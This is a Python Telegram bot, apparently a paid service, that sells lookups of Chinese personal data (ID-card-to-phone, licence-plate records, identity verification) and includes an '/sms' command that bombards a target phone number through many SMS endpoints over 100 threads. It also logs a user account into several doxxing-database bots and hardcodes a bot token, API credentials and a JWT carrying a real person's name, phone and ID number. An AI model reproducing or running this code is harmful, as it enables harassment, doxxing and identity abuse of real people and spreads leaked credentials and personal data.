#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import telebot
import requests
import time
import re
import threading
import json
import os
import sys
import asyncio
import itertools
import binascii
import random
import concurrent.futures
import inspect  
import urllib.parse
from datetime import datetime
from telebot import types
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError

# 屏蔽 SSL 证书报警
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

# Telegram 用户号配置 (用于签到)
TG_API_ID = 2040
TG_API_HASH = "b18441a1ff607e10a989891a5462e627"
USER_PHONE = '+243991464642'
SIGN_IN_BOTS = [
    {"name": "山东小纸条", "bot_username": "sdxhzbot", "command": "/qd"},
    {"name": "今日社工库", "bot_username": "jrsgk6_bot", "command": "/checkin"},
    {"name": "好望社工库", "bot_username": "haowangshegongkubot", "command": "/sign"},
    {"name": "优享", "bot_username": "youxs520_bot", "command": "/sign"},
    {"name": "云储", "bot_username": "yunchu_bot", "command": "/qd"},
    {"name": "mw社工库", "bot_username": "mwsgkbot", "command": "/qd"}
]

# 全局变量
bot = telebot.TeleBot(API_TOKEN)
user_points = {}
user_states = {}
sign_in_status = {}  # 记录签到状态

# 导入测压模块 (请确保这两个文件在同一目录下)
try:
    import sms_list 
    import sms_list_new
    from sms_list import *
except ImportError:
    print("⚠️ 警告: 未找到 sms_list 或 sms_list_new 模块，测压功能可能失效。")

# ================= 2. 数据处理 =================

def load_data():
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                return {int(k): float(v) for k, v in data.items()}
        except: pass
    return {}

user_points = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f:
        json.dump({str(k): v for k, v in user_points.items()}, f)

# ================= 3. 用户号登录 & 签到逻辑 (融合部分) =================

async def run_sign_in_task(client):
    """定时签到循环任务"""
    print("📅 自动签到协程已启动...")
    while True:
        try:
            now = datetime.now()
            # 每天 12:00 和 00:00 签到
            if now.hour in [12, 0]:
                print(f"[{now.strftime('%H:%M:%S')}] 开始执行批量签到...")
                for b in SIGN_IN_BOTS:
                    try:
                        await client.send_message(b['bot_username'], b['command'])
                        sign_in_status[b['name']] = f"✅ {now.strftime('%H:%M')}"
                        await asyncio.sleep(random.randint(5, 10)) # 随机延迟防止封号
                    except Exception as e:
                        sign_in_status[b['name']] = f"❌ 失败: {str(e)}"
                # 签到完后休眠一小时，防止重复触发
                await asyncio.sleep(3600)
            await asyncio.sleep(60) # 每分钟检查一次时间
        except Exception as e:
            print(f"签到任务异常: {e}")
            await asyncio.sleep(60)

async def init_user_client():
    """初始化 Telethon 用户客户端"""
    client = TelegramClient("my_account.session", TG_API_ID, TG_API_HASH)
    await client.connect()
    if not await client.is_user_authorized():
        print(f"--- 账号未登录，开始验证: {USER_PHONE} ---")
        await client.send_code_request(USER_PHONE)
        code = input("请输入手机收到的 Telegram 验证码: ")
        try:
            await client.sign_in(USER_PHONE, code)
        except SessionPasswordNeededError:
            password = input("该账号开启了两步验证，请输入密码: ")
            await client.sign_in(password=password)
    
    print("✅ 用户号登录成功！")
    asyncio.create_task(run_sign_in_task(client))
    return client

# ================= 4. 原有功能逻辑 =================

def cp_query_logic(chat_id, car_no, uid):
    url = f"http://zgzapi.idc.cn.com/车档.php?key=体验卡&cph={urllib.parse.quote(car_no)}"
    try:
        response = requests.get(url, timeout=15)
        response.encoding = 'utf-8'
        raw_res = response.text.strip()
        if raw_res and "未找到" not in raw_res and "错误" not in raw_res:
            user_points[uid] -= 2.5
            save_points()
            message = f"车牌查询结果:\n\n车牌号：{car_no}\n详细信息：\n{raw_res}\n\n已扣除 2.5 积分！\n当前余额: {user_points[uid]:.2f}"
        else:
            message = f"车牌查询结果:\n\n未匹配到有效车档信息。\n\n查询无结果，未扣除积分。\n当前余额: {user_points[uid]:.2f}"
        bot.send_message(chat_id, message)
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ 车档接口请求失败: {str(e)}")

def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    params = {"sfz": id_number}
    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.encoding = 'utf-8'
        raw_text = response.text.strip()
        phones = re.findall(r'1[3-9]\d{9}', raw_text)
        if phones:
            user_points[uid] -= 1.5
            save_points()
            unique_phones = list(dict.fromkeys(phones))
            phone_list_str = "\n".join([f"{idx+1}、{p}" for idx, p in enumerate(unique_phones)])
            result_body = f"匹配到 {len(unique_phones)} 个有效手机号:\n{phone_list_str}"
            cost_str = f"已扣除 1.5 积分！"
        else:
            result_body = "未匹配到有效手机号\n"
            cost_str = "查询无结果，未扣除积分。"
        bot.send_message(chat_id, f"身份证查询结果:\n\n{result_body}\n{cost_str}\n当前余额: {user_points[uid]:.2f}")
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")

def query_3ys_logic(chat_id, name, id_card, phone, uid):
    url = "http://xiaowunb.top/3ys.php"
    params = {"name": name, "sfz": id_card, "sjh": phone}
    try:
        response = requests.get(url, params=params, timeout=15)
        response.encoding = 'utf-8'
        user_points[uid] -= 0.05
        save_points()
        clean_res = re.sub(r'小无 API.*?官方客服:@\w+', '', response.text, flags=re.DOTALL).strip()
        res_status = "三要素核验成功✅" if ("成功" in clean_res or "一致" in clean_res) else "三要素核验失败❌"
        bot.send_message(chat_id, f"名字：{name}\n手机号：{phone}\n身份证：{id_card}\n结果：{res_status}\n\n已扣除 0.05 积分！\n当前积分余额：{user_points[uid]:.2f} 积分")
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ 系统异常: {str(e)}")

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {"Authorization": AUTH_BEARER, "Content-Type": "application/json"}
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.01
        save_points()
        res_json = r.json()
        res_type = "二要素核验一致✅" if res_json.get("success") else "二要素验证失败 ❌"
        bot.send_message(chat_id, f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.01** 积分！\n当前余额：**{user_points[uid]:.2f}**", parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {str(e)}")

# ================= 5. 短信测压 =================

def get_all_senders():
    all_funcs = []
    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
    for name, obj in inspect.getmembers(sms_list):
        if inspect.isfunction(obj) and name not in excludes:
            try:
                sig = inspect.signature(obj)
                if len(sig.parameters) >= 1: all_funcs.append(obj)
            except: pass
    return all_funcs

@bot.message_handler(commands=['sms'])
def sms_bomb_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
    target = parts[1]
    if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
    
    all_funcs = get_all_senders()
    bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
    user_points[uid] -= 3.5; save_points()
    
    def do_bomb():
        random.shuffle(all_funcs)
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            for func in all_funcs: executor.submit(func, target)
        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
    threading.Thread(target=do_bomb).start()

# ================= 6. 指令处理 & UI =================

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("使用帮助", callback_data="view_help"), 
        types.InlineKeyboardButton("在线充值", callback_data="view_pay"),
        types.InlineKeyboardButton("📋 签到记录", callback_data="view_sign_status")
    )
    return markup

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    return f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看教程\n1 USDT = 1 积分"

@bot.message_handler(commands=['start', 'cyh', '3ys', '2ys', 'cp', 'bq', 'add'])
def handle_commands(message):
    uid, chat_id = message.from_user.id, message.chat.id
    cmd = message.text.split()[0][1:]
    
    if cmd == 'start':
        if uid not in user_points: user_points[uid] = 0.0
        bot.send_message(chat_id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())
    elif cmd == 'add' and uid == ADMIN_ID:
        try:
            p = message.text.split(); tid, amt = int(p[1]), float(p[2])
            user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
            bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
        except: pass
    elif cmd == 'cyh':
        user_states[chat_id] = {'step': 'cyh_id'}; bot.send_message(chat_id, "请输入身份证号：")
    elif cmd == 'cp':
        user_states[chat_id] = {'step': 'v_cp'}; bot.send_message(chat_id, "请输入车牌号：")
    # ... 其他原有逻辑指令 ...

@bot.message_handler(func=lambda m: True)
def handle_all_msg(message):
    # 这里包含你原有的身份证/三要素/车牌自动识别逻辑
    uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
    if text.startswith('/'): return
    
    # 状态机逻辑 (此处精简，请参考你原有的逻辑填入)
    state = user_states.get(chat_id)
    if state:
        # 处理 bq, cyh 等分步操作...
        pass
    else:
        # 自动识别逻辑...
        if re.match(r'^[京津沪渝冀豫云辽黑湖南皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼]{1}[A-Z]{1}[A-Z0-9]{5,6}$', text.upper()):
            cp_query_logic(chat_id, text.upper(), uid)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "view_sign_status":
        status_msg = "📊 自动签到状态:\n\n"
        for k, v in sign_in_status.items():
            status_msg += f"{k}: {v}\n"
        if not sign_in_status: status_msg += "尚未开始执行。"
        bot.edit_message_text(status_msg, call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main")))
    elif call.data == "view_help":
        # 此处填入你原有的帮助文本...
        bot.edit_message_text("帮助内容...", call.message.chat.id, call.message.message_id, reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main")))
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, call.from_user.id, user_points.get(call.from_user.id, 0.0)), call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())

# ================= 7. 启动入口 =================

def run_telebot_poll():
    print("🤖 主机器人已启动...")
    bot.infinity_polling()

async def main():
    # A. 运行用户号登录和签到任务
    user_client = await init_user_client()
    
    # B. 在子线程运行 Telebot 轮询 (同步阻塞)
    threading.Thread(target=run_telebot_poll, daemon=True).start()
    
    # C. 保持异步主循环
    await user_client.run_until_disconnected()

if __name__ == "__main__":
    if sys.platform == "win32": os.system("chcp 65001 >nul")
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n程序手动停止")
